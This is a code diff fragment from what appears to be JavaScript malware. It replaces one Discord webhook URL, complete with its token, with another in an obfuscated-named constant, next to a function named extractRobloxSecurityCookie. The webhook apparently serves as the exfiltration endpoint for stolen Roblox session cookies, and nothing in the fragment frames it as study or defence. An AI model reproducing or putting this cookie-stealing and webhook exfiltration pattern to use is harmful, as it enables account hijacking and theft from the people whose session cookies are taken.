@@ -29,7 +29,7 @@ const doyouhavenothingbettertodo = [
     
       
 
-const adwdawdacsazdawradfsadaw = 'https://discord.com/api/webhooks/1353765690045239429/k7Iz5QBCzmmGtoC-xf5QunvhIPWZwUOFd5VZWuYb_mtSJ0Aw-WOnk5iNBiQ5xD7D34bv'
+const adwdawdacsazdawradfsadaw = 'https://discord.com/api/webhooks/1353774225181249566/4yLDywFMyhIaXvQSmH0_oojKSAZi1k_66WqJLEbpLcRm0qfTO8f_2Fywyl47irGMI9kI'
 
 
 function extractRobloxSecurityCookie(sessionId) {
